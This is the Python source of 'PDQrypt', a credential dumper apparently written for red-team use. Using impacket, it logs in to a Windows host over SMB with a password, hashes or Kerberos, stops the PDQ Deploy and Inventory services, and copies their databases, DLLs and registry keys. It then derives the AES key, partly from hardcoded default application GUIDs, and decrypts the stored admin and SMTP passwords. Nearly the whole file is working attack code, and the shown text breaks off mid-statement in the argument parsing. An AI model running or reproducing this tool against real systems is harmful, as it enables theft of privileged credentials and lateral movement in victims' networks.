import argparse
import codecs
import logging
import sqlite3
import os
import time
import re
import sys
import struct
import hashlib
import time
import sys
import binascii
from rich.console import Console
from rich.table import Table
from regipy.registry import RegistryHive
from binascii import unhexlify
from impacket import version
from impacket.uuid import string_to_bin, bin_to_string
from impacket.examples import logger
from impacket import smb3structs
from impacket.smbconnection import SMBConnection, SessionError
from impacket.dcerpc.v5 import transport, rrp, scmr, wkst, samr, epm, drsuapi
from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes, OfflineRegistry, RemoteFile
from impacket.dpapi import MasterKeyFile, MasterKey, DPAPI_BLOB, CredentialFile, CREDENTIAL_BLOB
from Cryptodome import Random
from Cryptodome.Cipher import AES

def title():
    print(f"""
██████╗░██████╗░░██████╗░██████╗░██╗░░░██╗██████╗░████████╗
██╔══██╗██╔══██╗██╔═══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝
██████╔╝██║░░██║██║██╗██║██████╔╝░╚████╔╝░██████╔╝░░░██║░░░
██╔═══╝░██║░░██║╚██████╔╝██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░
██║░░░░░██████╔╝░╚═██╔═╝░██║░░██║░░░██║░░░██║░░░░░░░░██║░░░
╚═╝░░░░░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░
"""
        )

class PDQRemoteOperations(RemoteOperations):
    def __init__(self, smbConnection, doKerberos, kdcHost=None, options=None):
        RemoteOperations.__init__(self, smbConnection, doKerberos, kdcHost)
        self.__smbConnection = smbConnection
        self.__options = options
        self.__deployService = 'PDQDeploy'
        self.__inventoryService = 'PDQInventory'
        self.__serviceData = {
            self.__inventoryService: {'shouldStart': False, 'stopped': False, 'shouldStop': False},
            self.__deployService:    {'shouldStart': False, 'stopped': False, 'shouldStop': False},
        }
        self.__inventoryServiceExists = False
        self.__deployServiceExists = False

    def gatherDbsAndDlls(self):
        if self.__options.local_parse:
            logging.info("Decrypting local credentials - No remote operations.")
            return
        self.__connectSvcCtl()
        inventory_db_success = False
        deploy_db_success = False
        inventory_dll_success = False
        deploy_dll_success = False
        try:
            if self.__checkServiceStatus(self.__inventoryService):
                self.__inventoryServiceExists = True
            if self.__checkServiceStatus(self.__deployService):
                self.__deployServiceExists = True

            if not self.__inventoryServiceExists and not self.__deployServiceExists:
                logging.error("Neither Inventory or Deploy services appear to be installed on the remote target. Quitting...")
                sys.exit(1) 

            
            inventory_dll_filename = 'AdminArsenal.PDQInventory.dll'
            deploy_dll_filename = 'AdminArsenal.PDQDeploy.dll'
            if self.__inventoryServiceExists:
                try:
                    with open(f'{inventory_dll_filename}', 'wb') as fh:
                        self.__smbConnection.getFile('C$', 'Program Files (x86)\\Admin Arsenal\\PDQ Inventory\\' + inventory_dll_filename, fh.write)
                        logging.debug(f"Inventory DLL found: {inventory_dll_filename}. Transferred...")
                        inventory_dll_success = True
                except Exception as e:
                    logging.error(f"Error processing file {inventory_dll_filename}: {e}")
                    logging.error(f"Maybe {inventory_dll_filename} is not inside its default installation location. Update the path and try again, or provide the file locally with -local-parse. Continuining to try and download Deploy DLL.")
            if self.__deployServiceExists:
                try:
                    with open(deploy_dll_filename, 'wb') as fh:
                            self.__smbConnection.getFile('C$', 'Program Files (x86)\\Admin Arsenal\\PDQ Deploy\\' + deploy_dll_filename, fh.write)
                            logging.debug(f"Deploy DLL found: {deploy_dll_filename}. Transferred...")
                            deploy_dll_success = True 
                except Exception as e:
                    logging.error(f"Error processing file {deploy_dll_filename}: {e}")
                    logging.error(f"Maybe {deploy_dll_filename} is not inside its default installation location. Update the path and try again, or provide the file locally with -local-parse. Continuining to try and download DBs anyway...")

            if not inventory_dll_success and not deploy_dll_success:
                logging.error("Failed to obtain both Inventory and Deploy DLLs. These can be obtained by downloading PDQ yourself or modifying the path in the code to where they are installed on the remote target.")
                sys.exit(1) 

            logging.info('Downloading PDQ Inventory and Deploy database files')
            fileNames = []

            if self.__inventoryServiceExists:
                if self.__options.inventory_db:
                    inventory_drive = self.__options.inventory_db.split(':\\')[0] + "$"
                    inventory_path = self.__options.inventory_db.split(':\\')[1] 
                    try:
                        with open('inventory.db', 'wb') as fh:
                            self.__smbConnection.getFile(inventory_drive, inventory_path, fh.write)
                            logging.info(f"Inventory DB found at {self.__options.inventory_db}") 
                            inventory_db_success = True
                    except Exception as e:
                        logging.error(f"Error processing file {self.__options.inventory_db}: {e}")
                        logging.error(f"Maybe {self.__options.inventory_db} is not inside its default installation location. Update the path and try again, or provide the file locally with -local-parse. Continuining to try and download Deploy DB anyway...")

            if self.__deployServiceExists:
                if self.__options.deploy_db:
                    deploy_drive = self.__options.deploy_db.split(':\\')[0] + "$"
                    deploy_path = self.__options.deploy_db.split(':\\')[1] 
                    try:
                        with open('deploy.db', 'wb') as fh:
                            self.__smbConnection.getFile(deploy_drive, deploy_path, fh.write)
                            logging.info(f"Deploy DB found at {self.__options.deploy_db}") 
                            deploy_db_success = True
                    except Exception as e:
                        logging.error(f"Error processing file {self.__options.deploy_db}: {e}")
                        logging.error(f"Maybe {self.__options.deploy_db} is not inside its default installation location. Update the path and try again, or provide the file locally with -local-parse.")

            if not inventory_db_success and not deploy_db_success:
                logging.error("Failed to obtain both Inventory and Deploy databases. Exiting gracefully.")
                sys.exit(1) 

            try:
                logging.info("Restarting stopped services...")
                self.__restore_services()
            except Exception as e:
                logging.error("Error restarting services... You may want to log in and start them manually.")

        except Exception as e:
            logging.error(f"Error in gatherDbsAndDlls: {e}")
            print(f"An error occurred during the database gathering process: {e}")
            sys.exit(1)
  
    def getRegistryKey(self, key):
        logging.debug(f'Saving registry data at {key}')
        return self._RemoteOperations__retrieveHive(key)

    def copyRegistryFiles(self, file):
        drive = file.split("\\")[3]
        path = file.split(drive)[1]
        try:
            if file.startswith("Inventory"):
                with open(f'inventory.reg', 'wb') as fh:
                    filename = "inventory.reg"
                    self.__smbConnection.getFile(drive, path, fh.write)
                    logging.info(f"Inventory registry security key transferred and saved in {filename}")
                return filename
            elif file.startswith("Deploy"):
                filename = "deploy.reg"
                with open(filename, 'wb') as fh:
                    self.__smbConnection.getFile(drive, path, fh.write)
                    logging.info(f"Deploy registry security key transferred and saved in {filename}!")
                return filename
            else: 
                logging.error("We should never have gotten here!")
                sys.exit(1)
        except Exception as e:
            logging.error(f"Failed to get registry files from remote target. Error: {e}")

    def __restore_services(self):
        for service, data in self.__serviceData.items():
            if data['shouldStart']:
                logging.info(f'Starting service {service}')
                scmr.hRStartServiceW(self.__scmr, getattr(self, f"__{service}ServiceHandle", None))

    def __connectSvcCtl(self):
        rpc = transport.DCERPCTransportFactory(self._RemoteOperations__stringBindingSvcCtl)
        rpc.set_smb_connection(self.__smbConnection)
        self.__scmr = rpc.get_dce_rpc()
        self.__scmr.connect()
        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)

    def __checkServiceStatus(self, service):
        ans = scmr.hROpenSCManagerW(self.__scmr)
        self.__scManagerHandle = ans['lpScHandle']
        # Check if the service exists
        try:
            ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, service)
        except Exception as e:
            logging.warning(f"Service {service} does not exist or cannot be accessed: {e}")
            return False  # Exit the function if the service does not exist
        service_handle = ans['lpServiceHandle']
        setattr(self, f"__{service}ServiceHandle", service_handle)
        logging.debug(f"Created attribute __{service}ServiceHandle for service handle.")
        ans = scmr.hRQueryServiceStatus(self.__scmr, service_handle)
        currentState = ans['lpServiceStatus']['dwCurrentState']
        serviceState = self.__serviceData[service]
        if currentState == scmr.SERVICE_STOPPED:
            logging.info(f"Service {service} is stopped")
            serviceState['shouldStart'] = False
            serviceState['stopped'] = True
            serviceState['shouldStop'] = False
        elif currentState == scmr.SERVICE_RUNNING:
            logging.debug(f"Service {service} is running")
            serviceState['shouldStart'] = True
            serviceState['stopped'] = False
            serviceState['shouldStop'] = True
        elif currentState == scmr.SERVICE_STOP_PENDING:
            logging.debug(f"Service {service} is still stopping")
            serviceState['shouldStart'] = True
            serviceState['stopped'] = False
            serviceState['shouldStop'] = False
        else:
            raise Exception(f"Unknown service state 0x{currentState:x} - Aborting")
        if not serviceState['stopped'] and serviceState['shouldStop']:
            logging.info(f"Stopping service {service}")
            scmr.hRControlService(self.__scmr, service_handle, scmr.SERVICE_CONTROL_STOP)
            i = 0
            time.sleep(3)
            while i < 60:
                ans = scmr.hRQueryServiceStatus(self.__scmr, service_handle)
                if ans['lpServiceStatus']['dwCurrentState'] != scmr.SERVICE_STOPPED:
                    i += 1
                    time.sleep(1)
                else:
                    break
            else:
                raise Exception(f"Failed to stop {service} within 60s - Aborting")
        return True

class PDQrypt():
    def __init__(self, inventoryUsernames, inventoryEncryptedPasswords, inventoryDbKey, inventoryAppKey, inventoryRegistryKey, deployUsernames, deployEncryptedPasswords, deployDbKey, deployAppKey, deployRegistryKey, decryptInventory, decryptDeploy):
        self.inventoryUsernames = inventoryUsernames
        self.inventoryEncryptedPasswords = inventoryEncryptedPasswords
        self.inventoryDbKey = inventoryDbKey
        self.inventoryAppKey = inventoryAppKey
        self.inventoryRegistryKey = inventoryRegistryKey
        self.deployUsernames = deployUsernames
        self.deployEncryptedPasswords = deployEncryptedPasswords
        self.deployDbKey = deployDbKey
        self.deployAppKey = deployAppKey
        self.deployRegistryKey = deployRegistryKey
        self.decryptInventory = decryptInventory
        self.decryptDeploy = decryptDeploy

    def decrypt(self):
        results = []
        if self.decryptInventory:
            combined_decryption_key = self.inventoryAppKey + self.inventoryDbKey + self.inventoryRegistryKey
            sha256_decryption_key = hashlib.sha256(combined_decryption_key.encode()).hexdigest()
            raw_sha256_decryption_key = binascii.unhexlify(sha256_decryption_key)
            inventory_decryption_key = raw_sha256_decryption_key[:16]
            logging.info(f"Inventory decryption key: {inventory_decryption_key.hex()}")
            for index, enc in enumerate(self.inventoryEncryptedPasswords):
                try:
                    enc_iv_size = enc[12]
                    enc_iv_end = 12 + enc_iv_size + 1
                    enc_iv = enc[13:enc_iv_end]
                    enc_data = enc[enc_iv_end:]
                    cipher = AES.new(inventory_decryption_key, AES.MODE_CBC, enc_iv)
                    decrypted_data = cipher.decrypt(enc_data).rstrip(b'\x00')
                    length = struct.unpack('<I', decrypted_data[:4])[0]
                    password = decrypted_data[4:4 + length].decode('utf-8')
                except Exception as e:
                    logging.error(f"Error decrypting Inventory password for user {username}: {e}")
                    password = "[Unable to Decrypt]"
                username = self.inventoryUsernames[index]
                logging.debug(f"Decrypted Inventory password for {username}: {password}")
                results.append(["PDQ Inventory", username, password])

        if self.decryptDeploy:
            combined_decryption_key = self.deployAppKey + self.deployDbKey + self.deployRegistryKey
            sha256_decryption_key = hashlib.sha256(combined_decryption_key.encode()).hexdigest()
            raw_sha256_decryption_key = binascii.unhexlify(sha256_decryption_key)
            deploy_decryption_key = raw_sha256_decryption_key[:16]
            logging.info(f"Deploy decryption key: {deploy_decryption_key.hex()}")
            for index, enc in enumerate(self.deployEncryptedPasswords):
                try:
                    enc_iv_size = enc[12]
                    enc_iv_end = 12 + enc_iv_size + 1
                    enc_iv = enc[13:enc_iv_end]
                    enc_data = enc[enc_iv_end:]
                    cipher = AES.new(deploy_decryption_key, AES.MODE_CBC, enc_iv)
                    decrypted_data = cipher.decrypt(enc_data).rstrip(b'\x00')
                    length = struct.unpack('<I', decrypted_data[:4])[0]
                    password = decrypted_data[4:4 + length].decode('utf-8')
                except Exception as e:
                    logging.error(f"Error decrypting Deploy password for user {username}: {e}")
                    password = "[Unable to Decrypt]"
                username = self.deployUsernames[index]
                logging.debug(f"Decrypted Deploy password for {username}: {password}")
                results.append(["PDQ Deploy", username, password])

        return self.display_results(results)

    @staticmethod
    def display_results(data):
        console = Console()
        table = Table(title="Decrypted Credentials")
        table.add_column("Software", style="cyan", justify="left")
        table.add_column("Username", style="magenta", justify="left")
        table.add_column("Password", style="green", justify="left")
        for row in data:
            table.add_row(*row)
        console.print(table)

class DumpSecrets:
    def __init__(self, remoteName, username='', password='', domain='', options=None):
        self.__remoteName = remoteName
        self.__remoteHost = options.target_ip
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__smbConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__noLMHash = True
        self.__isRemote = True
        self.__doKerberos = options.k
        self.__canProcessSAMLSA = True
        self.__kdcHost = options.dc_ip
        self.__options = options
        self.dpapiSystem = None
        self.deploy_dll = ["AdminArsenal.PDQDeploy.dll"]
        self.inventory_dll = ["AdminArsenal.PDQInventory.dll"]
        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                               self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def downloadDbAndDlls(self):
        self.__remoteOps.gatherDbsAndDlls()

    def getDbData(self):
        return self.readDb()

    def extractAppKeys(self):
        return self.extractGuidsFromDll()

    def registryKeyExtractor(self, key):
        return self.__remoteOps.getRegistryKey(key)

    def getRegistryFiles(self, file):
        return self.__remoteOps.copyRegistryFiles(file)

    def isValidSqlite(self, db_path):
        try:
            with sqlite3.connect(db_path) as conn:
                conn.execute("PRAGMA schema_version;")
            return True
        except sqlite3.DatabaseError:
            return False

    def parseRegistrySecureKey(self, reg_file):
        reg = RegistryHive(reg_file)
        try:
            for entry in reg.recurse_subkeys(as_json=True):
                entry_str = str(entry)
                secure_key = self.extractSecureKey(entry_str)
                if secure_key:
                    return secure_key
        except Exception as e:
            logging.error(f"Unabled to parse secure key from {reg_file}! Error: {e}")
            return None

    def extractSecureKey(self, output):
        secure_key_pattern = r"'name': 'Secure Key', 'value': '([0-9a-fA-F-]+)'"
        match = re.search(secure_key_pattern, output)
        if match:
            return match.group(1)
        else:
            return False

    def processDeployOrInventoryDb(self, db_path, out):
        try:
            with sqlite3.connect(db_path) as conn:
                secure_key_result = conn.execute("SELECT SecureKey FROM DatabaseInfo;").fetchone()
                product_result = conn.execute("SELECT ProductCode FROM DatabaseInfo;").fetchone()
                if secure_key_result and product_result:
                    product_code = product_result[0]
                    if "Deploy" in product_code:
                        out['deployDbSecureKey'] = secure_key_result[0]
                        credentials_results = conn.execute("SELECT username, password FROM Credentials;").fetchall()
                        for username, password in credentials_results:
                            out['deployUsernames'].append(username)
                            out['deployPasswords'].append(password)
                        try:
                            mail_credentials = conn.execute("SELECT (SELECT Value FROM Settings WHERE Name = 'MailServerSettings.User') AS Username, (SELECT Value FROM Settings WHERE Name = 'MailServerSettings.Password') AS Password;").fetchall()
                            for username, password in mail_credentials: 
                                if username is not None and password is not None:
                                    username = username + " (From SMTP Settings)"  
                                    out['deployUsernames'].append(username)
                                    out['deployPasswords'].append(password)
                        except Exception as e:
                            logging.info("No mail users are configured in Deploy!")
                    elif "Inventory" in product_code:
                        out['inventoryDbSecureKey'] = secure_key_result[0]
                        credentials_results = conn.execute("SELECT username, password FROM Credentials;").fetchall()
                        for username, password in credentials_results:
                            out['inventoryUsernames'].append(username)
                            out['inventoryPasswords'].append(password)
                        try:
                            mail_credentials = conn.execute("SELECT (SELECT Value FROM Settings WHERE Name = 'MailServerSettings.User') AS Username, (SELECT Value FROM Settings WHERE Name = 'MailServerSettings.Password') AS Password;").fetchall()
                            for username, password in mail_credentials: 
                                if username is not None and password is not None:  
                                    username = username + " (From SMTP Settings)"
                                    out['inventoryUsernames'].append(username)
                                    out['inventoryPasswords'].append(password)
                        except Exception as e:
                            logging.info("No mail users are configured in Inventory!")

        except Exception as e:
            logging.error(f"Error processing database {db_path}: {e}")

    def readDb(self, codec='utf-8'):
        out = {
            'deployUsernames': [],
            'deployPasswords': [],
            'inventoryUsernames': [],
            'inventoryPasswords': [],
            'deployDbSecureKey' : "",
            'inventoryDbSecureKey': ""
        }

        databases_to_process = []
        if self.__options.local_parse:
            local_inv_db = self.__options.local_inventory_db
            local_dep_db = self.__options.local_deploy_db
            local_inv_dll = self.__options.local_inventory_dll
            local_dep_dll = self.__options.local_deploy_dll
            local_inv_reg = self.__options.local_inventory_registry
            local_dep_reg = self.__options.local_deploy_registry
            have_inventory_set = bool(local_inv_db and local_inv_dll and local_inv_reg)
            have_deploy_set = bool(local_dep_db and local_dep_dll and local_dep_reg)
            if not have_inventory_set and not have_deploy_set:
                logging.error("You must supply at least one valid set of DB, DLL, and registry for Inventory or Deploy.")
                sys.exit(1)
            if have_inventory_set:
                if not os.path.isfile(local_inv_db):
                    logging.error("Invalid local inventory DB path.")
                    sys.exit(1)
                if not self.isValidSqlite(local_inv_db):
                    logging.error("Inventory DB is invalid.")
                    sys.exit(1)
                self.inventory_dll = [local_inv_dll]
                databases_to_process.append(local_inv_db)
                out['inventoryLocalRegistryGuid'] = local_inv_reg
            if have_deploy_set:
                if not os.path.isfile(local_dep_db):
                    logging.error("Invalid local deploy DB path.")
                    sys.exit(1)
                if not self.isValidSqlite(local_dep_db):
                    logging.error("Deploy DB is invalid.")
                    sys.exit(1)
                self.deploy_dll = [local_dep_dll]
                databases_to_process.append(local_dep_db)
                out['deployLocalRegistryGuid'] = local_dep_reg
        else:
            deploydbpath = os.path.join(os.getcwd(), "deploy.db")
            inventorydbpath = os.path.join(os.getcwd(), "inventory.db")
            if os.path.isfile(deploydbpath) and self.isValidSqlite(deploydbpath):
                databases_to_process.append(deploydbpath)
            else:
                logging.warning("deploy.db not found or is not a valid SQLite database.")
            if os.path.isfile(inventorydbpath) and self.isValidSqlite(inventorydbpath):
                databases_to_process.append(inventorydbpath)
            else:
                logging.warning("inventory.db not found or is not a valid SQLite database.")

        if not databases_to_process:
            logging.error("No valid SQLite databases were found. Exiting.")
            sys.exit(1)

        for db_path in databases_to_process:
            self.processDeployOrInventoryDb(db_path, out)
        deploy_fields = ['deployUsernames', 'deployPasswords']
        inventory_fields = ['inventoryUsernames', 'inventoryPasswords']
        if not (
            all(out.get(field) for field in deploy_fields) or
            all(out.get(field) for field in inventory_fields)
        ):
            missing_fields = [
                field for field in (deploy_fields + inventory_fields) if not out.get(field)
            ]
            for field in missing_fields:
                logging.error(f"Missing data from database. Field {field} could not be extracted.")
                return None
        if not out.get('inventoryDbSecureKey') and not out.get('deployDbSecureKey'):
            logging.error("Missing secure key. Neither inventoryDbSecureKey nor deployDbSecureKey could be extracted.")
            logging.error(f"Contents of out variable: {out}")
            return None
        return out

    def extractGuidsFromDll(self):
        out = {
            "inventoryAppKey": "",
            "deployAppKey": ""
        }
        def processDll(file_path):
            try:
                with open(file_path, 'rb') as dll_file:
                    content = dll_file.read()
                    try:
                        decoded_content = content.decode('utf-16-le', errors='ignore')
                    except UnicodeDecodeError:
                        decoded_content = content.decode('utf-16-le', errors='replace')
                    guid_pattern = re.compile(
                        r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}'
                    )
                    matches = guid_pattern.findall(decoded_content)

                    return matches
            except FileNotFoundError:
                logging.error(f"File not found: {file_path}")
                return []
            except Exception as e:
                logging.error(f"An error occurred while processing the DLL {file_path}: {e}")
                return []
        for file in self.inventory_dll:
            guids = processDll(file)
            if guids:
                out["inventoryAppKey"] = guids[0]
        for file in self.deploy_dll:
            guids = processDll(file)
            if guids:
                out["deployAppKey"] = guids[0]
        return out

    def dump(self):
        try:
            if self.__options.local_parse:
                logging.info("Decrypting local credentials - No remote operations.")
                self.__isRemote = False
                dbData = self.getDbData()
                if not dbData:
                    logging.error("Failed to retrieve local DB data.")
                    sys.exit(1)
                appData = self.extractAppKeys()
                if not appData:
                    logging.error("Failed to extract local GUID from DLLs.")
                    sys.exit(1)
                inventoryRegistryKey = None
                deployRegistryKey = None
                if dbData.get('inventoryLocalRegistryGuid'):
                    inventoryRegistryKey = dbData.get('inventoryLocalRegistryGuid')
                if dbData.get('deployLocalRegistryGuid'):
                    deployRegistryKey = dbData.get('deployLocalRegistryGuid')
                deployUsernames = dbData.get('deployUsernames', [])
                deployEncryptedPasswords = dbData.get('deployPasswords', [])
                inventoryUsernames = dbData.get('inventoryUsernames', [])
                inventoryEncryptedPasswords = dbData.get('inventoryPasswords', [])
                inventoryDbKey = dbData.get('inventoryDbSecureKey', '')
                deployDbKey = dbData.get('deployDbSecureKey', '')
                inventoryAppKey = appData.get('inventoryAppKey', "")
                deployAppKey = appData.get('deployAppKey', "")
                decrypt_inventory = False
                decrypt_deploy = False
                if (all([inventoryUsernames, inventoryEncryptedPasswords, inventoryDbKey, inventoryAppKey, inventoryRegistryKey])):
                    decrypt_inventory = True
                if (all([deployUsernames, deployEncryptedPasswords, deployDbKey, deployAppKey, deployRegistryKey])):
                    decrypt_deploy = True
                if not decrypt_inventory and not decrypt_deploy:
                    logging.error("Cannot decrypt. Missing data for either Inventory or Deploy.")
                    sys.exit(1)
                pdqrypt = PDQrypt(
                    inventoryUsernames=inventoryUsernames if inventoryUsernames else None,
                    inventoryEncryptedPasswords=inventoryEncryptedPasswords if inventoryEncryptedPasswords else None,
                    inventoryDbKey=inventoryDbKey if inventoryDbKey else None,
                    inventoryAppKey=inventoryAppKey if inventoryAppKey else None,
                    inventoryRegistryKey=inventoryRegistryKey if inventoryRegistryKey else None,
                    deployUsernames=deployUsernames if deployUsernames else None,
                    deployEncryptedPasswords=deployEncryptedPasswords if deployEncryptedPasswords else None,
                    deployDbKey=deployDbKey if deployDbKey else None,
                    deployAppKey=deployAppKey if deployAppKey else None,
                    deployRegistryKey=deployRegistryKey if deployRegistryKey else None,
                    decryptInventory=decrypt_inventory,
                    decryptDeploy=decrypt_deploy
                )
                pdqrypt.decrypt()
            else:
                try:
                    self.connect()
                except Exception as e:
                    if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                        logging.debug('SMBConnection did not work, continuing anyway')
                    else:
                        raise
                self.__remoteOps  = PDQRemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost, self.__options)
                self.downloadDbAndDlls()
                dbData = self.getDbData()
                if dbData:
                    deployUsernames = dbData.get('deployUsernames', [])
                    deployEncryptedPasswords = dbData.get('deployPasswords', [])
                    inventoryUsernames = dbData.get('inventoryUsernames', [])
                    inventoryEncryptedPasswords = dbData.get('inventoryPasswords', [])
                    inventoryDbKey = dbData.get('inventoryDbSecureKey', '')
                    deployDbKey = dbData.get('deployDbSecureKey', '')
                    if len(deployUsernames) > 0:
                        for index, (username, password) in enumerate(zip(deployUsernames, deployEncryptedPasswords)):
                            logging.info(f"Found Deploy User {index + 1}: {username}")
                            logging.debug(f"Encrypted Password: {password.hex()}")
                    if len(inventoryUsernames) > 0:
                        for index, (username, password) in enumerate(zip(inventoryUsernames, inventoryEncryptedPasswords)):
                            logging.info(f"Found Inventory User {index + 1}: {username}")
                            logging.debug(f"Encrypted Password: {password.hex()}")
                    if inventoryDbKey:
                        logging.info(f"Got Inventory Database SecureKey: {inventoryDbKey}")
                    if deployDbKey:
                        logging.info(f"Got Deploy Database SecureKey: {deployDbKey}")
                else:
                    logging.error("Failed to retrieve data in getDbData()! Check the DB path.")
                    sys.exit(1)
                appData = self.extractAppKeys()
                if appData:
                    inventoryAppKey = appData.get('inventoryAppKey', "")
                    deployAppKey = appData.get('deployAppKey', "")
                    if inventoryAppKey:
                        logging.debug(f"Got Potential Inventory Key from DLL.")
                    else:
                        logging.debug(f"Not able to find the Inventory key in the DLL. Trying the default.")
                        inventoryAppKey = "ABBFD279-6D00-40BC-BAE9-1F86BFFB103E"
                    if deployAppKey:
                        logging.debug(f"Got Potential Deploy Key from DLL.")
                    else:
                        logging.debug(f"Not able to find the Deploy key in the DLL. Trying the default.")
                        deployAppKey = "043E2818-3D63-41F9-9803-B03593F33C7D"
                    # Exit if neither key is present
                    if not inventoryAppKey and not deployAppKey:
                        logging.error("Both Inventory and Deploy Application Keys are missing. Cannot proceed.")
                        sys.exit(1)
                self.__remoteOps.enableRegistry()
                inventoryRegistryPath = self.registryKeyExtractor("SOFTWARE\\Admin Arsenal\\PDQ Inventory")
                if inventoryRegistryPath:
                    logging.info(f"PDQ Inventory registry saved to: {inventoryRegistryPath}")
                    inventoryRegistryPath = f"Inventory - {inventoryRegistryPath}"
                    inventoryReg = self.getRegistryFiles(inventoryRegistryPath)
                    inventoryRegistryKey = self.parseRegistrySecureKey(inventoryReg)
                    if inventoryRegistryKey:
                        logging.info(f"PDQ Inventory registry key: {inventoryRegistryKey}")
                else:
                    logging.error(f"Could not find registry key for PDQ Inventory!")
                deployRegistryPath = self.registryKeyExtractor("SOFTWARE\\Admin Arsenal\\PDQ Deploy")
                if deployRegistryPath:
                    logging.info(f"PDQ Deploy registry saved to: {deployRegistryPath}")
                    deployRegistryPath = f"Deploy - {deployRegistryPath}"
                    deployReg = self.getRegistryFiles(deployRegistryPath)
                    deployRegistryKey = self.parseRegistrySecureKey(deployReg)
                    if deployRegistryKey:
                        logging.info(f"PDQ Deploy registry key: {deployRegistryKey}")
                else:
                    logging.error(f"Could not find registry key for PDQ Deploy!")
                if not inventoryRegistryKey and not deployRegistryKey:
                    logging.error("One or more required registry keys are missing. Exiting...")
                    sys.exit(1)
                decrypt_inventory = False
                decrypt_deploy = False
                if (all([inventoryUsernames, inventoryEncryptedPasswords, inventoryDbKey, inventoryAppKey, inventoryRegistryKey])):
                    decrypt_inventory = True  
                if (all([deployUsernames, deployEncryptedPasswords, deployDbKey, deployAppKey, deployRegistryKey])):
                    decrypt_deploy = True
                if decrypt_inventory or decrypt_deploy:
                    logging.info("We have all the prerequisites to decrypt, starting process...")
                else:
                    logging.error("Cannot proceed without the required data from either Inventory or Deploy.")
                    sys.exit(1)
                pdqrypt = PDQrypt(
                    inventoryUsernames=inventoryUsernames if inventoryUsernames else None,
                    inventoryEncryptedPasswords=inventoryEncryptedPasswords if inventoryEncryptedPasswords else None,
                    inventoryDbKey=inventoryDbKey if inventoryDbKey else None,
                    inventoryAppKey=inventoryAppKey if inventoryAppKey else None,
                    inventoryRegistryKey=inventoryRegistryKey if inventoryRegistryKey else None,
                    deployUsernames=deployUsernames if deployUsernames else None,
                    deployEncryptedPasswords=deployEncryptedPasswords if deployEncryptedPasswords else None,
                    deployDbKey=deployDbKey if deployDbKey else None,
                    deployAppKey=deployAppKey if deployAppKey else None,
                    deployRegistryKey=deployRegistryKey if deployRegistryKey else None,
                    decryptInventory=decrypt_inventory,
                    decryptDeploy=decrypt_deploy
                )
                pdqrypt.decrypt()
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
        finally:
            try:
                self.cleanup()
            except:
                pass

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()

if __name__ == '__main__':
    logger.init()
    if sys.stdout.encoding is None:
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)
    title()
    print('PDQ Deploy and Inventory Credential Dumper - by @heartburn-dev - v1.0')
    parser = argparse.ArgumentParser(add_help=True, description="Remotely or locally extract PDQ credentials. Requires admin access if performing remotely. If local parse is used, specify at least one COMPLETE set of local DB, DLL, and registry for Inventory or Deploy. For example, an Inventory DB, Inventory DLL, and Inventory registry key. If the script is failing to decrypt, it is highly likely that the input data is incorrect. It requires the DB and Registry key from the SAME target, as well as potentially the correct DLL version from the target.")
    parser.add_argument('target', nargs='?', default='LOCAL', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-inventory-db', action='store', default='C:\\ProgramData\\Admin Arsenal\\PDQ Inventory\\Database.db', help='Location of the Inventory database file on the REMOTE server. Set to the default location if not provided.')
    parser.add_argument('-deploy-db', action='store', default='C:\\ProgramData\\Admin Arsenal\\PDQ Deploy\\Database.db', help='Location of the Deploy database file on the REMOTE server. Set to the default location if not provided.')
    parser.add_argument('-local-parse', action='store_true', help='Enables local parse of PDQ files. Must include at least one complete set of DB, DLL, and registry')
    parser.add_argument('-local-inventory-db', action='store', default=None, help='Local path to the Inventory DB file')
    parser.add_argument('-local-deploy-db', action='store', default=None, help='Local path to the Deploy DB file')
    parser.add_argument('-local-inventory-dll', action='store', default=None, help='Local path to the Inventory DLL file')
    parser.add_argument('-local-deploy-dll', action='store', default=None, help='Local path to the Deploy DLL file')
    parser.add_argument('-local-inventory-registry', action='store', default=None, help='Local Inventory registry GUID')
    parser.add_argument('-local-deploy-registry', action='store', default=None, help='Local Deploy registry GUID')
    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='Do not ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP of the domain controller')
    group.add_argument('-target-ip', action='store', metavar="ip address", help='IP of the target machine')
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    options = parser.parse_args()
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)
    domain, username, password, remoteName = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(options.target).groups('')
    if '@' in remoteName:
